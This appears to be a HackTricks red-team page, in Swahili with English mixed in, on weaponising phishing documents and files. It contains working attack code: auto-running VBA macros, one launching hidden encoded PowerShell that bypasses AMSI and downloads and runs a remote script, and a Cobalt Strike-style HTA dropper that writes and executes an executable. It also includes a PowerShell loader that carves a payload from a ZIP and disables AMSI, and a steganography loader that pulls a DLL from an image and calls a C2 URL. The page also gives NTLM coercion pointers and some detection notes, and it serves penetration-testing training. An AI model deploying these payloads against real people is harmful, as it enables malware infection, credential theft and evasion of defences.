# Faili na Nyaraka za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Nyaraka za Office

Microsoft Word hufanya uthibitisho wa data za faili kabla ya kufungua faili. Uthibitisho wa data hufanywa kwa njia ya utambuzi wa muundo wa data, kulingana na kiwango cha OfficeOpenXML. Ikiwa kosa lolote litatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.

Kwa kawaida, mafaili ya Word yanayojumuisha macros hutumia ugani `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha ugani wa faili na bado kuhifadhi uwezo wao wa kutekeleza macros.\
Kwa mfano, faili la RTF haliiungi mkono macros, kwa muundo, lakini faili la DOCM lililobadilishwa jina kuwa RTF litashughulikiwa na Microsoft Word na litakuwa na uwezo wa kutekeleza macro.\
Mifumo ya ndani na mbinu sawa zinatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint etc.).

Unaweza kutumia amri ifuatayo kuangalia ni ugani gani yatakayotekelezwa na baadhi ya programu za Office:
```bash
assoc | findstr /i "word excel powerp"
```
Faili za DOCX zinazorejea template ya mbali (File –Options –Add-ins –Manage: Templates –Go) ambayo inajumuisha macros zinaweza pia kuendesha macros.

### Kupakia Picha za Nje

Nenda kwa: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Inawezekana kutumia macros kuendesha msimbo wowote kutoka kwenye hati.

#### Autoload functions

Zinapo kuwa za kawaida zaidi, ndivyo AV inavyowezekana kuvitambua.

- AutoOpen()
- Document_Open()

#### Mifano ya Msimbo ya Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mkono

Nenda kwa **File > Info > Inspect Document > Inspect Document**, ambayo itaonyesha Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.

#### Ugani la Doc

Wakati umemaliza, chagua **Save as type** dropdown, badilisha muundo kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
Fanya hivi kwa sababu huwezi kuhifadhi macro's ndani ya **`.docx`** na kuna stigma kuhusu ugani uliowezeshwa kwa macro **`.docm`** (km. ikoni ya thumbnail ina `!` kubwa na baadhi ya gateway za wavuti/baruapepe zinaweza kuzizuia kabisa). Kwa hivyo, **ugani wa legacy `.doc` ni suluhisho bora la kati**.

#### Jenereta za Macros Zenye Madhara

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Faili za HTA

HTA ni programu ya Windows inayochanganya **HTML na lugha za scripting (kama VBScript na JScript)**. Inaunda muonekano wa mtumiaji na inatekelezwa kama programu "fully trusted", bila vikwazo vya modeli ya usalama ya browser.

HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kawaida **imewekwa** pamoja na **Internet Explorer**, na hivyo kufanya **`mshta` utegemee IE**. Hivyo ikiwa imeondolewa, HTAs haziwezi kutekelezwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **force NTLM authentication "remotely"**, kwa mfano, unaweza kuongeza **invisible images** kwenye emails au HTML ambazo mtumiaji atazitumia (hata HTTP MitM?). Au kumtumia mwathiriwa **address of files** ambazo zita**trigger** **authentication** kwa ajili ya **opening the folder.**

**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba unaweza sio tu kuiba hash au authentication bali pia **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Kampeni zenye ufanisi mkubwa huwasilisha ZIP inayojumuisha nyaraka mbili za kudanganya halali (PDF/DOCX) na .lnk yenye madhara. Njia ya ujanja ni kwamba PowerShell loader halisi imehifadhiwa ndani ya ZIP’s raw bytes baada ya unique marker, na .lnk inachonga na kuiendesha kikamilifu katika memory.

Mtiririko wa kawaida unaotekelezwa na .lnk PowerShell one-liner:

1) Tafuta ZIP ya awali katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na parent ya current working directory.
2) Soma ZIP bytes na tafuta hardcoded marker (e.g., xFIQCV). Kila kitu kilicho nyuma ya marker ni embedded PowerShell payload.
3) Nakili ZIP hadi %ProgramData%, extract huko, na fungua decoy .docx ili ionekane halali.
4) Bypass AMSI kwa current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate stage inayofuata (e.g., ondoa wote # characters) na itekeleze katika memory.

Mfano wa PowerShell skeleton ili kuchonga na kuendesha stage iliyowekwa ndani:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Vidokezo
- Uwasilishaji mara nyingi hutumia vibaya subdomains zenye sifa za PaaS (mf., *.herokuapp.com) na unaweza kuweka vizuizi kwa payloads (kutoa ZIP zisizo hatari kulingana na IP/UA).
- Hatua inayofuata mara nyingi huvunja usimbaji wa base64/XOR shellcode na kuutekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza mabaki kwenye diski.

Uendelevu unaotumika katika mnyororo huo ule
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Uwindaji/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.

Mtiririko wa kazi
- Hatua 1: Archived JS/VBS dropper → inatafsiri Base64 iliyojazwa ndani → inaanzisha PowerShell stager na -nop -w hidden -ep bypass.
- Hatua 2: PowerShell stager → inadownload picha, inakata Base64 iliyozuiliwa na alama, inapakia .NET DLL kwa memory na kuitisha method yake (mf., VAI) ikipitisha C2 URL na chaguo.
- Hatua 3: Loader inapata payload ya mwisho na kwa kawaida huingiza kupitia process hollowing ndani ya binary ya kuaminika (kwa kawaida MSBuild.exe). Tazama zaidi kuhusu process hollowing na trusted utility proxy execution hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kukata DLL kutoka kwenye picha na kuitisha method ya .NET kwa in-memory:

<details>
<summary>Mchimbaji na mzindua wa payload ya stego ya PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Maelezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding). Alama zinatofautiana kati ya kampeni.
- AMSI/ETW bypass na string deobfuscation kawaida hutumika kabla ya kupakia assembly.
- Ufuatiliaji: skana picha zilizopakuliwa kwa delimiters zinazojulikana; tambua PowerShell inayofikia picha na mara moja ku-decoda blobs za Base64.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Awamu ya mwanzo inayojirudia mara nyingi ni `.js` ndogo au `.vbs` iliyofichwa sana iliyowasilishwa ndani ya archive. Kusudi lake pekee ni ku-decoda string ya Base64 iliyojazwa ndani na kuanzisha PowerShell na `-nop -w hidden -ep bypass` ili kuanzisha awamu inayofuata kupitia HTTPS.

Muundo wa mantiki (muhtasari):
- Soma yaliyomo kwenye faili yake mwenyewe
- Tafuta blob ya Base64 kati ya mfululizo wa takataka
- Decoda hadi ASCII PowerShell
- Endesha kwa `wscript.exe`/`cscript.exe` ikimwita `powershell.exe`

Vidokezo vya ufuatiliaji
- Viambatisho vya JS/VBS vilivyohifadhiwa vinavyozalisha `powershell.exe` na `-enc`/`FromBase64String` kwenye mstari wa amri.
- `wscript.exe` ikianzisha `powershell.exe -nop -w hidden` kutoka njia za temp za mtumiaji.

## Windows files to steal NTLM hashes

Angalia ukurasa kuhusu **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
